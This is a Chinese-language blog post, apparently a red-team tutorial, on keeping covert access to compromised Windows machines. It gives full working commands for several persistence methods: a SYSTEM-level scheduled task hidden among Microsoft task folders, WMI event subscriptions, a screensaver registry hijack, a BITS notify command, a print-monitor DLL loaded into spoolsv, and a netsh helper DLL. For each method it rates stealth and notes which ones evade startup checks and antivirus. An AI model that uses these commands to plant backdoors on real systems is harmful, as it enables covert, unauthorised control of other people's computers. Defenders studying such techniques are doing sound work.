    <span class="token punctuation">[</span><span class="token operator">/</span>RI interval<span class="token punctuation">]</span> <span class="token punctuation">[</span> <span class="token punctuation">{</span><span class="token operator">/</span>ET endtime <span class="token operator">|</span> <span class="token operator">/</span>DU duration<span class="token punctuation">}</span> <span class="token punctuation">[</span><span class="token operator">/</span>K<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>XML xmlfile<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>V1<span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token punctuation">[</span><span class="token operator">/</span>SD startdate<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>ED enddate<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>IT <span class="token operator">|</span> <span class="token operator">/</span>NP<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>Z<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">/</span>F<span class="token punctuation">]</span>

描述<span class="token punctuation">:</span>
     允许管理员在本地或远程系统上创建计划任务。

参数列表<span class="token punctuation">:</span>
    <span class="token operator">/</span>S   system        指定要连接到的远程系统。如果省略这个
                       系统参数，默认是本地系统。

    <span class="token operator">/</span>U   username      指定应在其中执行 SchTasks<span class="token punctuation">.</span>exe 的用户上下文。

    <span class="token operator">/</span>P   <span class="token punctuation">[</span>password<span class="token punctuation">]</span>    指定给定用户上下文的密码。如果省略则
                       提示输入。

    <span class="token operator">/</span>RU  username      指定任务在其下运行的“运行方式”用户
                       帐户<span class="token punctuation">(</span>用户上下文<span class="token punctuation">)</span>。对于系统帐户，有效
                       值是 <span class="token string">""</span>、<span class="token string">"NT AUTHORITY\SYSTEM"</span> 或
                       <span class="token string">"SYSTEM"</span>。
                       对于 v2 任务，<span class="token string">"NT AUTHORITY\LOCALSERVICE"</span>和
                       <span class="token string">"NT AUTHORITY\NETWORKSERVICE"</span>以及常见的 SID
                         对这三个也都可用。

    <span class="token operator">/</span>RP  <span class="token punctuation">[</span>password<span class="token punctuation">]</span>    指定“运行方式”用户的密码。要提示输
                       入密码，值必须是 <span class="token string">"*"</span> 或无。系统帐户会忽略该
                       密码。必须和 <span class="token operator">/</span>RU 或 <span class="token operator">/</span>XML 开关一起使用。

<span class="token operator">/</span>RU<span class="token operator">/</span>XML    <span class="token operator">/</span>SC   schedule     指定计划频率。
                       有效计划任务<span class="token punctuation">:</span>  MINUTE、 HOURLY、DAILY、WEEKLY、
                       MONTHLY<span class="token punctuation">,</span> ONCE<span class="token punctuation">,</span> ONSTART<span class="token punctuation">,</span> ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>

    <span class="token operator">/</span>MO   modifier     改进计划类型以允许更好地控制计划重复
                       周期。有效值列于下面“修改者”部分中。

    <span class="token operator">/</span>D    days         指定该周内运行任务的日期。有效值<span class="token punctuation">:</span>
                       MON、TUE、WED、THU、FRI、SAT、SUN
                       和对 MONTHLY 计划的 <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">31</span>
                       <span class="token punctuation">(</span>某月中的日期<span class="token punctuation">)</span>。通配符“<span class="token operator">*</span>”指定所有日期。

    <span class="token operator">/</span>M    months       指定一年内的某月。默认是该月的第一天。
                       有效值<span class="token punctuation">:</span> JAN、FEB、MAR、APR、MAY、JUN、
                       JUL、 AUG、SEP、OCT、NOV  和 DEC。通配符
                       “<span class="token operator">*</span>” 指定所有的月。

    <span class="token operator">/</span>I    idletime     指定运行一个已计划的 ONIDLE 任务之前
                       要等待的空闲时间。
                       有效值范围<span class="token punctuation">:</span> <span class="token number">1</span> 到 <span class="token number">999</span> 分钟。

    <span class="token operator">/</span>TN   taskname     指定唯一识别这个计划任务的名称。

    <span class="token operator">/</span>TR   taskrun      指定在这个计划时间运行的程序的路径
                       和文件名。
                       例如<span class="token punctuation">:</span> C<span class="token punctuation">:</span>\windows\system32\calc<span class="token punctuation">.</span>exe

    <span class="token operator">/</span>ST   starttime    指定运行任务的开始时间。
                       时间格式为 HH<span class="token punctuation">:</span>mm <span class="token punctuation">(</span><span class="token number">24</span> 小时时间<span class="token punctuation">)</span>，例如 <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">30</span> 表示
                       <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">30</span> PM。如果未指定 <span class="token operator">/</span>ST，则默认值为
                       当前时间。<span class="token operator">/</span>SC ONCE 必需有此选项。

    <span class="token operator">/</span>RI   interval     用分钟指定重复间隔。这不适用于
                       计划类型<span class="token punctuation">:</span> MINUTE、HOURLY、
                       ONSTART<span class="token punctuation">,</span> ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>
                       有效范围<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">599940</span> 分钟。
                       如果已指定 <span class="token operator">/</span>ET 或 <span class="token operator">/</span>DU，则其默认值为
                       <span class="token number">10</span> 分钟。

    <span class="token operator">/</span>ET   endtime      指定运行任务的结束时间。
                       时间格式为 HH<span class="token punctuation">:</span>mm <span class="token punctuation">(</span><span class="token number">24</span> 小时时间<span class="token punctuation">)</span>，例如，<span class="token number">14</span><span class="token punctuation">:</span><span class="token number">50</span> 表示 <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">50</span> PM
。
                       这不适用于计划类型<span class="token punctuation">:</span> ONSTART、
                       ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>

    <span class="token operator">/</span>DU   duration     指定运行任务的持续时间。
                       时间格式为 HH<span class="token punctuation">:</span>mm。这不适用于 <span class="token operator">/</span>ET 和
                       计划类型<span class="token punctuation">:</span> ONSTART<span class="token punctuation">,</span> ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>
                       对于 <span class="token operator">/</span>V1 任务，如果已指定 <span class="token operator">/</span>RI，则持续时间默认值为
                       <span class="token number">1</span> 小时。

    <span class="token operator">/</span>K                 在结束时间或持续时间终止任务。
                       这不适用于计划类型<span class="token punctuation">:</span> ONSTART、
                       ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>
                       必须指定 <span class="token operator">/</span>ET 或 <span class="token operator">/</span>DU。

    <span class="token operator">/</span>SD   startdate    指定运行任务的第一个日期。
                       格式为 yyyy<span class="token operator">/</span>mm<span class="token operator">/</span>dd。默认值为
                       当前日期。这不适用于计划类型<span class="token punctuation">:</span> ONCE、
                       ONSTART<span class="token punctuation">,</span> ONLOGON<span class="token punctuation">,</span> ONIDLE<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>

    <span class="token operator">/</span>ED   enddate      指定此任务运行的最后一天的日期。
                       格式是 yyyy<span class="token operator">/</span>mm<span class="token operator">/</span>dd。这不适用于计划类型<span class="token punctuation">:</span>
                        ONCE、ONSTART、ONLOGON、ONIDLE。

    <span class="token operator">/</span>EC   ChannelName  为 OnEvent 触发器指定事件通道。

    <span class="token operator">/</span>IT                仅有在 <span class="token operator">/</span>RU 用户当前已登录且
                       作业正在运行时才可以交互式运行任务。
                       此任务只有在用户已登录的情况下才运行。

    <span class="token operator">/</span>NP                不储存任何密码。任务以给定用户的身份
                       非交互的方式运行。只有本地资源可用。

    <span class="token operator">/</span>Z                 标记在最终运行完任务后删除任务。

    <span class="token operator">/</span>XML  xmlfile      从文件的指定任务 XML 中创建任务。
                       可以组合使用 <span class="token operator">/</span>RU 和 <span class="token operator">/</span>RP 开关，或者在任务 XML 已包含
                       主体时单独使用 <span class="token operator">/</span>RP。

    <span class="token operator">/</span>V1                创建 Vista 以前的平台可以看见的任务。
                       不兼容 <span class="token operator">/</span>XML。

    <span class="token operator">/</span>F                 如果指定的任务已经存在，则强制创建
                       任务并抑制警告。

    <span class="token operator">/</span>RL   level        为作业设置运行级别。有效值为
                       LIMITED 和 HIGHEST。默认值为 LIMITED。

    <span class="token operator">/</span>DELAY delaytime   指定触发触发器后延迟任务运行的
                       等待时间。时间格式为
                       mmmm<span class="token punctuation">:</span>ss。此选项仅对计划类型
                       ONSTART<span class="token punctuation">,</span> ONLOGON<span class="token punctuation">,</span> ONEVENT<span class="token punctuation">.</span>

    <span class="token operator">/</span><span class="token operator">?</span>                 显示此帮助消息。

修改者<span class="token punctuation">:</span> 按计划类型的 <span class="token operator">/</span>MO 开关的有效值<span class="token punctuation">:</span>
    MINUTE<span class="token punctuation">:</span>  <span class="token number">1</span> 到 <span class="token number">1439</span> 分钟。
    HOURLY<span class="token punctuation">:</span>  <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">23</span> 小时。
    DAILY<span class="token punctuation">:</span>   <span class="token number">1</span> 到 <span class="token number">365</span> 天。
    WEEKLY<span class="token punctuation">:</span>  <span class="token number">1</span> 到 <span class="token number">52</span> 周。
    ONCE<span class="token punctuation">:</span>    无修改者。
    ONSTART<span class="token punctuation">:</span> 无修改者。
    ONLOGON<span class="token punctuation">:</span> 无修改者。
    ONIDLE<span class="token punctuation">:</span>  无修改者。
    MONTHLY<span class="token punctuation">:</span> <span class="token number">1</span> 到 <span class="token number">12</span>，或
             FIRST<span class="token punctuation">,</span> SECOND<span class="token punctuation">,</span> THIRD<span class="token punctuation">,</span> FOURTH<span class="token punctuation">,</span> LAST<span class="token punctuation">,</span> LASTDAY。

    ONEVENT<span class="token punctuation">:</span>  XPath 事件查询字符串。
示例<span class="token punctuation">:</span>
    <span class="token operator">==</span><span class="token operator">&gt;</span> 在远程机器 <span class="token string">"ABC"</span> 上创建计划任务 <span class="token string">"doc"</span>，
        该机器每小时在 <span class="token string">"runasuser"</span> 用户下运行 notepad<span class="token punctuation">.</span>exe。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>S ABC <span class="token operator">/</span>U user <span class="token operator">/</span>P password <span class="token operator">/</span>RU runasuser
                 <span class="token operator">/</span>RP runaspassword <span class="token operator">/</span>SC HOURLY <span class="token operator">/</span>TN doc <span class="token operator">/</span>TR notepad

    <span class="token operator">==</span><span class="token operator">&gt;</span> 在远程机器 <span class="token string">"ABC"</span> 上创建计划任务 <span class="token string">"accountant"</span>，
        在指定的开始日期和结束日期之间的开始时间和结束时间内，
        每隔五分钟运行 calc<span class="token punctuation">.</span>exe。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>S ABC <span class="token operator">/</span>U domain\user <span class="token operator">/</span>P password <span class="token operator">/</span>SC MINUTE
                 <span class="token operator">/</span>MO <span class="token number">5</span> <span class="token operator">/</span>TN accountant <span class="token operator">/</span>TR calc<span class="token punctuation">.</span>exe <span class="token operator">/</span>ST <span class="token number">12</span><span class="token punctuation">:</span><span class="token number">00</span> <span class="token operator">/</span>ET <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">00</span>
                 <span class="token operator">/</span>SD <span class="token number">06</span><span class="token operator">/</span><span class="token number">06</span><span class="token operator">/</span><span class="token number">2006</span> <span class="token operator">/</span>ED <span class="token number">06</span><span class="token operator">/</span><span class="token number">06</span><span class="token operator">/</span><span class="token number">2006</span> <span class="token operator">/</span>RU runasuser <span class="token operator">/</span>RP userpassword

    <span class="token operator">==</span><span class="token operator">&gt;</span> 创建计划任务 <span class="token string">"gametime"</span>，在每月的第一个星期天
        运行“空当接龙”。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>SC MONTHLY <span class="token operator">/</span>MO first <span class="token operator">/</span>D SUN <span class="token operator">/</span>TN gametime
                 <span class="token operator">/</span>TR c<span class="token punctuation">:</span>\windows\system32\freecell

    <span class="token operator">==</span><span class="token operator">&gt;</span> 在远程机器 <span class="token string">"ABC"</span> 创建计划任务 <span class="token string">"report"</span>，
        每个星期运行 notepad<span class="token punctuation">.</span>exe。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>S ABC <span class="token operator">/</span>U user <span class="token operator">/</span>P password <span class="token operator">/</span>RU runasuser
                 <span class="token operator">/</span>RP runaspassword <span class="token operator">/</span>SC WEEKLY <span class="token operator">/</span>TN report <span class="token operator">/</span>TR notepad<span class="token punctuation">.</span>exe

    <span class="token operator">==</span><span class="token operator">&gt;</span> 在远程机器 <span class="token string">"ABC"</span> 创建计划任务 <span class="token string">"logtracker"</span>，
        每隔五分钟从指定的开始时间到无结束时间，
        运行 notepad<span class="token punctuation">.</span>exe。将提示输入 <span class="token operator">/</span>RP
        密码。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>S ABC <span class="token operator">/</span>U domain\user <span class="token operator">/</span>P password <span class="token operator">/</span>SC MINUTE
                 <span class="token operator">/</span>MO <span class="token number">5</span> <span class="token operator">/</span>TN logtracker
                 <span class="token operator">/</span>TR c<span class="token punctuation">:</span>\windows\system32\notepad<span class="token punctuation">.</span>exe <span class="token operator">/</span>ST <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">30</span>
                 <span class="token operator">/</span>RU runasuser <span class="token operator">/</span>RP

    <span class="token operator">==</span><span class="token operator">&gt;</span> 创建计划任务 <span class="token string">"gaming"</span>，每天从 <span class="token number">12</span><span class="token punctuation">:</span><span class="token number">00</span> 点开始到
        <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">00</span> 点自动结束，运行 freecell<span class="token punctuation">.</span>exe。

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>SC DAILY <span class="token operator">/</span>TN gaming <span class="token operator">/</span>TR c<span class="token punctuation">:</span>\freecell <span class="token operator">/</span>ST <span class="token number">12</span><span class="token punctuation">:</span><span class="token number">00</span>
                 <span class="token operator">/</span>ET <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">00</span> <span class="token operator">/</span>K
    <span class="token operator">==</span><span class="token operator">&gt;</span> 创建计划任务“EventLog”以开始运行 wevtvwr<span class="token punctuation">.</span>msc
        只要在“系统”通道中发布事件 <span class="token number">101</span>

        SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>TN EventLog <span class="token operator">/</span>TR wevtvwr<span class="token punctuation">.</span>msc <span class="token operator">/</span>SC ONEVENT
                 <span class="token operator">/</span>EC System <span class="token operator">/</span>MO <span class="token operator">*</span><span class="token punctuation">[</span>System<span class="token operator">/</span>EventID<span class="token operator">=</span><span class="token number">101</span><span class="token punctuation">]</span>
    <span class="token operator">==</span><span class="token operator">&gt;</span> 文件路径中可以加入空格，但需要加上两组引号，
        一组引号用于 CMD<span class="token punctuation">.</span>EXE，另一组用于 SchTasks<span class="token punctuation">.</span>exe。用于 CMD
        的外部引号必须是一对双引号；内部引号可以是一对单引号或
        一对转义双引号<span class="token punctuation">:</span>
        SCHTASKS <span class="token operator">/</span>Create
           <span class="token operator">/</span>tr "<span class="token string">'c:\program files\internet explorer\iexplorer.exe'</span>
           \<span class="token string">"c:\log data\today.xml\""</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p>“计划任务程序库”中也是有路径的，Windows初始状态在根目录中是没有计划任务的，如下图：<br>
<img src="https://img-blog.csdnimg.cn/20201004224444458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
当然子目录中也是没有计划任务的：<br>
<img src="https://img-blog.csdnimg.cn/20201004224612828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
计划任务都被放在了最内层目录里面，因此为了确保隐蔽性，我们也可以遵守Windows默认的规范在“\Microsoft\Windows\”下面新建我们的子目录和计划任务。示例命令如下：</p>
<pre><code class="prism language-c">SCHTASKS <span class="token operator">/</span>Create <span class="token operator">/</span>RU SYSTEM <span class="token operator">/</span>SC ONSTART <span class="token operator">/</span>RL HIGHEST <span class="token operator">/</span>TN \Microsoft\Windows\evil\eviltask <span class="token operator">/</span>TR C<span class="token punctuation">:</span>\Users\hunter\Desktop\evil<span class="token punctuation">.</span>exe
</code></pre>
<p>无需登录即可收到beacon：<br>
<img src="https://img-blog.csdnimg.cn/20201004224652769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在进程树中，恶意进程是被taskeng.exe即任务计划程序引擎拉起的，隐蔽性弱于DLL服务，但强于自启注册键。</p>
<p>但是，大坑又来了，我们发现SCHTASKS命令功能并不完整，很多配置项是无法操作的，比如不支持同时创建多个触发器，不支持修改“条件”和“设置”选项卡中的功能。如下：<br>
<img src="https://img-blog.csdnimg.cn/20201004225033310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004225038709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这些选项都是任务创建时的默认状态，也就是说我们的计划任务不会在睡眠唤醒时启动，断开交流电源自动停止，超过3天自动停止。而这些高级选项却不支持用命令行配置，查了一下微软社区，官方给的回复竟然是这样的：<br>
<img src="https://img-blog.csdnimg.cn/20201004225053283.png#pic_center" alt="在这里插入图片描述"><br>
哭笑不得…对于正常用户使用起来确实没问题，但对于红队来说，我们不方便操作GUI啊！当然也可以通过制作DLL模块或exe直接调用WINAPI来操作，但那还需要额外再上传一个文件，效率稍低。因此计划任务这个持久化的路子只能作为一个保险，并不能完全依赖。<br>
此外还有一个有些相似的利用点——组策略。在启动脚本处可以执行cmd脚本或ps脚本从而执行任意命令，但由于命令行版本的组策略编辑器功能太过受限，就不再做展开（如果可以登录桌面的话直接去gpedit.msc去配置启动脚本即可持久化，且隐蔽性较高）</p>
<p><strong>0x05 WMI</strong></p>
<p>权限要求：未降权的管理员权限</p>
<p>我们可以认为WMI是一组可以直接与Windows操作系统交互的API，由于这是操作系统自带的工具，无需安装，因此也是权限维持的好帮手。</p>
<p>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：</p>
<pre><code class="prism language-c">wmic <span class="token operator">/</span>NAMESPACE<span class="token punctuation">:</span><span class="token string">"\\root\subscription"</span> PATH __EventFilter CREATE Name<span class="token operator">=</span><span class="token string">"evil"</span><span class="token punctuation">,</span> EventNameSpace<span class="token operator">=</span><span class="token string">"root\cimv2"</span><span class="token punctuation">,</span>QueryLanguage<span class="token operator">=</span><span class="token string">"WQL"</span><span class="token punctuation">,</span> Query<span class="token operator">=</span><span class="token string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310"</span>

wmic <span class="token operator">/</span>NAMESPACE<span class="token punctuation">:</span><span class="token string">"\\root\subscription"</span> PATH CommandLineEventConsumer CREATE Name<span class="token operator">=</span><span class="token string">"evilConsumer"</span><span class="token punctuation">,</span> ExecutablePath<span class="token operator">=</span><span class="token string">"C:\Users\hunter\Desktop\beacon.exe"</span><span class="token punctuation">,</span>CommandLineTemplate<span class="token operator">=</span><span class="token string">"C:\Users\hunter\Desktop\beacon.exe"</span>

wmic <span class="token operator">/</span>NAMESPACE<span class="token punctuation">:</span><span class="token string">"\\root\subscription"</span> PATH __FilterToConsumerBinding CREATE Filter<span class="token operator">=</span><span class="token string">"__EventFilter.Name=\"evil\""</span><span class="token punctuation">,</span> Consumer<span class="token operator">=</span><span class="token string">"CommandLineEventConsumer.Name=\"evilConsumer\""</span>
</code></pre>
<p>由于时间区间的落点不一定相同，特定情况下有可能会出现多个beacon：</p>
<p><img src="https://img-blog.csdnimg.cn/20201004225141528.png#pic_center" alt="在这里插入图片描述"><br>
看下进程树，隐蔽性一般：<br>
<img src="https://img-blog.csdnimg.cn/20201004225154540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x06 屏幕保护</strong></p>
<p>权限要求：普通用户。</p>
<p>虽然未必所有用户都会使用屏幕保护，但幸运的是屏幕保护程序的相关配置都在注册表中，如下图的四个键：<br>
<img src="https://img-blog.csdnimg.cn/20201004225215960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
完整路径如下：</p>
<pre><code class="prism language-c">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE<span class="token punctuation">.</span>EXE
</code></pre>
<p>直接写入注册表即可：</p>
<pre><code class="prism language-c">reg add <span class="token string">"hkcu\control panel\desktop"</span> <span class="token operator">/</span>v SCRNSAVE<span class="token punctuation">.</span>EXE <span class="token operator">/</span>d C<span class="token punctuation">:</span>\Users\hunter\Desktop\beacon<span class="token punctuation">.</span>exe <span class="token operator">/</span>f
reg add <span class="token string">"hkcu\control panel\desktop"</span> <span class="token operator">/</span>v ScreenSaveActive <span class="token operator">/</span>d <span class="token number">1</span> <span class="token operator">/</span>f
reg add <span class="token string">"hkcu\control panel\desktop"</span> <span class="token operator">/</span>v ScreenSaverIsSecure <span class="token operator">/</span>d <span class="token number">0</span> <span class="token operator">/</span>f
reg add <span class="token string">"hkcu\control panel\desktop"</span> <span class="token operator">/</span>v ScreenSaveTimeOut <span class="token operator">/</span>d <span class="token number">60</span> <span class="token operator">/</span>f
</code></pre>
<p>看一下进程树，winlogon.exe拉起来的，隐蔽性一般：<br>
<img src="https://img-blog.csdnimg.cn/20201004225243384.png#pic_center" alt="在这里插入图片描述"><br>
这里又有个小坑，如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。</p>
<p>当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p>
<p><strong>0x07 后台智能传输服务（BITS）</strong></p>
<p>权限要求：管理员权限（不必过UAC）</p>
<p>后台智能传送服务 (BITS) 可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft® Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。——摘自百度百科</p>
<p>网上的“渗透教程”中有很多利用bitsadmin命令下载文件或执行命令的操作，但它其实也可以用来做权限维持，并且可以绕过Autoruns的检测以及杀软的自启命令执行保护</p>
<p>添加任务的命令很简单，只有4条：</p>
<pre><code class="prism language-c">bitsadmin <span class="token operator">/</span>create evil
bitsadmin <span class="token operator">/</span>addfile evil <span class="token string">"C:\Users\hunter\Desktop\beacon.exe"</span> <span class="token string">"C:\Users\hunter\Desktop\beacon.exe"</span>
bitsadmin<span class="token punctuation">.</span>exe <span class="token operator">/</span>SetNotifyCmdLine evil <span class="token string">"C:\Users\hunter\Desktop\beacon.exe"</span> NUL
bitsadmin <span class="token operator">/</span>Resume evil
</code></pre>
<p>其有个优点是可以在降权的管理员回话中执行（不过UAC），当然得到的beacon也是降权的：<img src="https://img-blog.csdnimg.cn/20201004225329441.png#pic_center" alt="在这里插入图片描述"><br>
重启后由于任务并未结束，依然会被系统拉起，达到了持久化的目的。虽然后台智能传输服务的任务默认时长是90天，90天后任务自动取消，但对于红队来说这已经足够了：<br>
<img src="https://img-blog.csdnimg.cn/20201004225341646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
看一下进程树，是“<code>svchost.exe -k netsvcs</code>"拉起的。但由于是独立进程，隐蔽性一般：<br>
<img src="https://img-blog.csdnimg.cn/20201004225446318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这种方法可以绕过目前所有启动项检查工具，唯一检测方式是通过bistamin命令：</p>
<pre><code class="prism language-c">bitsadmin <span class="token operator">/</span>list <span class="token operator">/</span>allusers <span class="token operator">/</span>verbose
</code></pre>
<p>可以看到所有任务如下（忘记截图，这是另一台测试机，数据不同）：<br>
<img src="https://img-blog.csdnimg.cn/20201004225510807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x07 后台打印程序服务</strong></p>
<p>权限要求：未降权的管理员权限。</p>
<p>后台打印程序服务负责管理Windows操作系统中的打印作业，由于很多用户还是要使用打印机的，所以优化软件也不会推荐禁用这个服务。打印后台处理程序的API包含一个函数-AddMonitor，用于安装本地端口监视器并连接配置、数据和监视器文件。该函数会将DLL注入到spoolsv.exe进程以实现相应功能。</p>
<p>系统初始状态下需要调用的DLL如下：<br>
<img src="https://img-blog.csdnimg.cn/20201004225741267.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004225749586.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004225757319.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201004225731553.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201004225811130.png#pic_center" alt="在这里插入图片描述"><br>
这些DLL都是包含与打印服务驱动相关的内容，那么我们也可以利用这个机制驻留一个恶意DLL，当然，和注册服务一样，这必须要未降权的管理员权限。</p>
<p>首先将恶意DLL放到C:\Windows\System32\路径下：<br>
<img src="https://img-blog.csdnimg.cn/20201004225826178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
然后执行命令添加相关注册表项和Driver键：</p>
<pre><code class="prism language-c">reg add <span class="token string">"hklm\system\currentcontrolset\control\print\monitors\monitor"</span> <span class="token operator">/</span>v <span class="token string">"Driver"</span> <span class="token operator">/</span>d <span class="token string">"monitor.dll"</span> <span class="token operator">/</span>t REG_SZ
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100422585577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
重新启动后，恶意DLL则会被自动加载到spoolsv.exe，隐蔽性较强：<br>
<img src="https://img-blog.csdnimg.cn/20201004225908539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
控制端以SYSTEM权限上线（这里演示暂时用的MSF，CS的DLL还要自己重写一个）：<br>
<img src="https://img-blog.csdnimg.cn/20201004225921965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x08 Netsh</strong></p>
<p>权限要求：未降权的管理员权限。</p>
<p>netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效：<br>
<img src="https://img-blog.csdnimg.cn/20201004225942258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
因此可以通过导入helperdll的方式做权限维持，命令格式如下：</p>
<pre><code class="prism language-c">netsh add helper <span class="token punctuation">[</span>Absolute evil DLL path<span class="token punctuation">]</span>
</code></pre>
